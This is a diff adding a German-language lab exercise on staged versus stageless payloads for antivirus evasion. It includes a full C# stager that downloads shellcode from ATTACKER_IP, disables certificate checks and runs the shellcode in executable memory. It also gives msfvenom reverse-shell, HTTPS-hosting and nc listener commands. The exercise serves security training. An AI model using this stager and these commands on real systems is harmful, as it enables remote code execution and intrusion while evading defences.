@@ -463,3 +463,213 @@ Stelle sicher den obigen Text gelesen zu haben.
 ```
 Keine Antwort nötig
 ```
+
+# Task 6 - Staged Payloads
+In unserem Ziel, die AV zu umgehen, werden wir zwei Hauptansätze finden, um den finalen Shellcode einem Opfer zuzustellen. Abhängig von der Methode werden die Nutzlasten üblicherweise als **staged** oder **stageless** Payloads kategorisiert. In dieser Aufgabe werden wir die Unterschiede beider Ansätze und die Vorteile jeder Methode betrachten.
+
+### Stageless Payloads
+
+Eine nicht gestufte Nutzlast bettet den finalen Shellcode direkt in sich selbst ein. Man kann sie sich wie eine verpackte App vorstellen, die den Shellcode in einem einstufigen Prozess ausführt. In früheren Aufgaben haben wir eine ausführbare Datei eingebettet, die einen einfachen `Calc` Shellcode eingebettet hat, wodurch eine nicht gestufte Nutzlast erstellt wurde.
+![Ablauf eines nicht gestuften Payloads](Bilder/2024-07-05-Ablauf-einer-nicht-gestuften-Payload.png)
+
+Im obigen Beispiel, wenn der Benutzer die bösartige Payload ausführt, wird der eingebettete Shellcode ausgeführt und dem Angreifer eine Reverse-Shell bereitstellen.
+
+### Staged Payloads
+
+Staged Payloads funktionieren, indem sie Zwischen-Shellcodes verwenden, die als Schritte zur Ausführung eines finalen Shellcodes dienen. Jeder dieser Zwischen-Shellcodes wird als Stager bezeichnet, und sein Hauptziel ist es, eine Methode bereitzustellen, um den finalen Shellcode abzurufen und letztendlich auszuführen.
+
+Obwohl es Payloads mit mehreren Stufen geben kann, handelt es sich im Normalfall um eine zweistufige Payload, bei der die erste Stufe, die wir **stage0** nennen, ein Platzhalter-Shellcode ist, der eine Verbindung zur Maschine des Angreifers herstellt, um den finalen Shellcode herunterzuladen und auszuführen.
+![Ablauf eines gestuften Payloads](Bilder/2024-07-05-Ablauf-einer-gestuften-Payload.png)
+
+Einmal abgerufen, wird der stage0-Stub den finalen Shellcode irgendwo im Speicher des Payload-Prozesses injizieren und ausführen (wie unten gezeigt).
+![Staged vs. Non-Staged Payloads in der Cybersicherheit](Bilder/2024-07-05-Staged-vs.-Non-Staged-Payloads-in-der-Cybersicherheit.png)
+
+Staged vs. Stageless
+
+Bei der Entscheidung, welche Art von Payload zu verwenden ist, müssen wir uns der Umgebung bewusst sein, die wir angreifen werden. Jede Art von Payload hat Vor- und Nachteile, je nach dem spezifischen Angriffsszenario.
+
+Im Fall von Stageless-Payloads haben Sie folgende Vorteile:
+
+- Die resultierende ausführbare Datei enthält alles, was benötigt wird, um unseren Shellcode zum Laufen zu bringen.
+- Der Payload wird ausgeführt, ohne zusätzliche Netzwerkverbindungen zu benötigen. Je weniger Netzwerkinteraktionen, desto geringer die Wahrscheinlichkeit, von einem IPS erkannt zu werden.
+- Wenn Sie einen Host angreifen, der sehr eingeschränkte Netzwerkverbindungen hat, möchten Sie möglicherweise Ihren gesamten Payload in einem einzigen Paket haben.
+
+Für Staged-Payloads haben Sie:
+
+- Geringer Speicherbedarf auf der Festplatte. Da Stage0 nur für das Herunterladen des finalen Shellcodes zuständig ist, wird es wahrscheinlich klein sein.
+- Der finale Shellcode ist nicht in die ausführbare Datei eingebettet. Wenn Ihr Payload erfasst wird, hat das Blue Team nur Zugriff auf den Stage0-Stub und nichts weiter.
+- Der finale Shellcode wird im Speicher geladen und berührt niemals die Festplatte. Dies macht ihn weniger anfällig für Erkennung durch AV-Lösungen.
+- Sie können denselben Stage0-Dropper für viele Shellcodes wiederverwenden, indem Sie einfach den finalen Shellcode ersetzen, der an die Opfermaschine gesendet wird.
+
+Zusammenfassend lässt sich sagen, dass weder die eine noch die andere Art grundsätzlich besser ist, es sei denn, wir fügen etwas Kontext hinzu. Im Allgemeinen sind Stageless-Payloads besser für Netzwerke geeignet, die stark abgesichert sind, da sie nicht darauf angewiesen sind, den finalen Shellcode aus dem Internet herunterzuladen. Wenn Sie beispielsweise einen USB-Drop-Angriff durchführen, um Computer in einer geschlossenen Netzwerkumgebung anzugreifen, in der Sie keine Verbindung zu Ihrer Maschine zurückbekommen werden, ist Stageless die beste Wahl.
+
+Staged-Payloads hingegen sind großartig, wenn Sie möchten, dass Ihr Fußabdruck auf der lokalen Maschine minimal ist. Da sie den finalen Payload im Speicher ausführen, könnten einige AV-Lösungen Schwierigkeiten haben, sie zu erkennen. Sie eignen sich auch gut, um Ihre Shellcodes nicht zu offenbaren (die normalerweise erhebliche Zeit zur Vorbereitung benötigen), da der Shellcode zu keinem Zeitpunkt auf der Festplatte des Opfers abgelegt wird.
+
+Stagers in Metasploit
+
+Bei der Erstellung von Payloads mit msfvenom oder der Verwendung in Metasploit können Sie wählen, ob Sie staged oder stageless Payloads verwenden möchten. Als Beispiel, wenn Sie eine umgekehrte TCP-Shell generieren möchten, finden Sie zwei Payloads für diesen Zweck mit leicht unterschiedlichen Namen (beachten Sie das _ versus / nach shell).
+| Payload | Type |
+| ------- | ---- |
+| windows/x64/shell_reverse_tcp | Stageless payload |
+| windows/x64/shell/reverse_tcp | Staged payload |
+
+Generell werden Sie feststellen, dass dieselben Namensmuster auch auf andere Arten von Shells angewendet werden. Um beispielsweise einen stageless Meterpreter zu verwenden, würden wir `windows/x64/meterpreter_reverse_tcp` verwenden, anstatt `windows/x64/meterpreter/reverse_tcp`, was für seine staged Version funktioniert.
+
+### Erstellung Ihres eigenen Stagers
+
+Um einen staged Payload zu erstellen, verwenden wir eine leicht modifizierte Version des Stager-Codes, der von [@mvelazc0](https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs) bereitgestellt wurde. Den vollständigen Code unseres Stagers können Sie hier erhalten, er ist aber auch auf Ihrem Windows-Rechner unter `C:\Tools\CS Files\StagedPayload.cs` verfügbar.
+```CS
+using System;
+using System.Net;
+using System.Text;
+using System.Configuration.Install;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography.X509Certificates;
+
+public class Program {
+  //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
+  [DllImport("kernel32")]
+  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+  //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
+  [DllImport("kernel32")]
+  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
+  [DllImport("kernel32")]
+  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+  private static UInt32 MEM_COMMIT = 0x1000;
+  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+  public static void Main()
+  {
+    string url = "https://ATTACKER_IP/shellcode.bin";
+    Stager(url);
+  }
+
+  public static void Stager(string url)
+  {
+
+    WebClient wc = new WebClient();
+    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+    byte[] shellcode = wc.DownloadData(url);
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
+
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+  }
+}
+```
+
+Der Code mag auf den ersten Blick einschüchternd wirken, ist jedoch relativ einfach. Lassen Sie uns Schritt für Schritt analysieren, was er macht.
+
+Der erste Teil des Codes wird einige Windows-API-Funktionen über P/Invoke importieren. Die benötigten Funktionen sind die folgenden drei aus `kernel32.dll`:
+| WinAPI Function          | Description                                                           |
+|--------------------------|-----------------------------------------------------------------------|
+| VirtualAlloc()           | Ermöglicht uns, Speicher zu reservieren, der von unserem Shellcode verwendet werden soll. |
+| CreateThread()           | Erstellt einen Thread als Teil des aktuellen Prozesses.                |
+| WaitForSingleObject()    | Wird zur Thread-Synchronisierung verwendet. Ermöglicht das Warten auf das Beenden eines Threads, bevor mit der Ausführung fortgefahren wird. |
+
+Der Teil des Codes, der für den Import dieser Funktionen zuständig ist, lautet wie folgt:
+```CS
+//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
+[DllImport("kernel32")]
+private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
+[DllImport("kernel32")]
+private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
+[DllImport("kernel32")]
+private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+```
+
+Der bedeutendste Teil unseres Codes wird in der Funktion Stager() liegen, wo die Logik des Stagers implementiert wird. Die Stager-Funktion wird eine URL erhalten, von der der auszuführende Shellcode heruntergeladen wird.
+
+Der erste Teil der `Stager()` Funktion wird ein neues `WebClient()` Objekt erstellen, das es uns ermöglicht, den Shellcode über Webanfragen herunterzuladen. Bevor die eigentliche Anfrage gestellt wird, überschreiben wir die `ServerCertificateValidationCallback` Methode, die für die Validierung von SSL-Zertifikaten bei HTTPS-Anfragen zuständig ist, damit der WebClient keine Beschwerden über selbstsignierte oder ungültige Zertifikate macht, die wir auf dem Webserver verwenden, der die Payloads hostet. Danach rufen wir die `DownloadData()` Methode auf, um den Shellcode von der angegebenen URL herunterzuladen und ihn in der Variablen `shellcode` zu speichern:
+```CS
+WebClient wc = new WebClient();
+ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
+byte[] shellcode = wc.DownloadData(url);
+```
+
+Sobald unser Shellcode heruntergeladen und in der Variable `shellcode` verfügbar ist, müssen wir ihn in ausführbaren Speicher kopieren, bevor wir ihn tatsächlich ausführen können. Wir verwenden `VirtualAlloc()`, um einen Speicherblock vom Betriebssystem anzufordern. Beachten Sie, dass wir genug Speicher für `shellcode.Length` Bytes anfordern und das Flag `PAGE_EXECUTE_READWRITE` setzen, um den zugewiesenen Speicher ausführbar, lesbar und beschreibbar zu machen. Sobald unser ausführbarer Speicherblock reserviert und der Variablen `codeAddr` zugewiesen ist, verwenden wir `Marshal.Copy()`, um den Inhalt der Variable `shellcode` in die Variable `codeAddr` zu kopieren.
+```CS
+UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
+```
+
+Nun, da wir eine Kopie des Shellcodes in einem Block ausführbaren Speichers allokiert haben, verwenden wir die Funktion `CreateThread()`, um einen neuen Thread im aktuellen Prozess zu erzeugen, der unseren Shellcode ausführt. Der dritte Parameter, der an CreateThread übergeben wird, zeigt auf `codeAddr`, wo unser Shellcode gespeichert ist. Dadurch wird beim Start des Threads der Inhalt unseres Shellcodes ausgeführt, als wäre es eine normale Funktion. Der fünfte Parameter ist auf 0 gesetzt, was bedeutet, dass der Thread sofort starten wird.
+
+Sobald der Thread erstellt wurde, rufen wir die Funktion `WaitForSingleObject()` auf, um unserem aktuellen Programm mitzuteilen, dass es auf die Beendigung der Thread-Ausführung warten muss, bevor es weitermacht. Dies verhindert, dass unser Programm geschlossen wird, bevor der Shellcode-Thread eine Chance hat, ausgeführt zu werden:
+```CS
+IntPtr threadHandle = IntPtr.Zero;
+UInt32 threadId = 0;
+IntPtr parameter = IntPtr.Zero;
+threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+```
+
+Um den Code zu kompilieren, empfehlen wir, ihn als Datei namens staged-payload.cs auf einen Windows-Rechner zu kopieren und mit folgendem Befehl zu kompilieren:
+```powershell
+PS C:\> csc staged-payload.cs
+```
+
+### Verwenden unseres Stagers zur Ausführung einer Reverse-Shell
+
+Nachdem unser Payload kompiliert wurde, müssen wir einen Webserver einrichten, um den finalen Shellcode zu hosten. Denken Sie daran, dass unser Stager sich mit diesem Server verbinden wird, um den Shellcode abzurufen und ihn im Speicher der Opfermaschine auszuführen. Beginnen wir damit, einen Shellcode zu generieren (der Dateiname muss mit der URL in unserem Stager übereinstimmen):
+```shell
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
+```
+
+Beachten Sie, dass wir das Raw-Format für unseren Shellcode verwenden, da der Stager alles direkt in den Speicher laden wird, was er herunterlädt.
+
+Nun, da wir einen Shellcode haben, richten wir einen einfachen HTTPS-Server ein. Zuerst müssen wir ein selbstsigniertes Zertifikat mit folgendem Befehl erstellen:
+```shell
+user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
+```
+
+Sie werden nach einigen Informationen gefragt, aber Sie können gerne die Eingabetaste drücken, um die angeforderten Informationen zu überspringen, da das SSL-Zertifikat nicht gültig sein muss. Sobald wir ein SSL-Zertifikat haben, können wir einen einfachen HTTPS-Server mit Python3 starten, indem wir den folgenden Befehl verwenden:
+```shell
+user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
+```
+
+Mit allem bereit können wir jetzt unseren Stager-Payload ausführen. Der Stager sollte sich mit dem HTTPS-Server verbinden und die Datei shellcode.bin abrufen, um sie in den Speicher zu laden und auf der Zielmaschine auszuführen. Denken Sie daran, einen nc-Listener einzurichten, um die umgekehrte Shell auf dem gleichen Port zu empfangen, der beim Ausführen von msfvenom angegeben wurde:
+```shell
+user@AttackBox$ nc -lvp 7474
+```
+
+## Fragen:
+Liefern gestagte Payloads den gesamten Inhalt unseres Payloads in einem einzelnen Paket? (ja/nein)
+```
+
+```
+
+Ist der Metasploit-Payload windows/x64/meterpreter_reverse_https ein gestagter Payload? (ja/nein)
+```
+
+```
+
+Ist Stage0 eines gestagten Payloads dafür zuständig, den finalen Payload herunterzuladen, der ausgeführt werden soll? (ja/nein)
+```
+
+```
+
+Folgen Sie den Anweisungen, um eine gestagte Payload zu erstellen und sie in der THM Antivirus-Überprüfung unter http://MACHINE_IP/ hochzuladen.
+```
+Keine Antwort nötig
+```
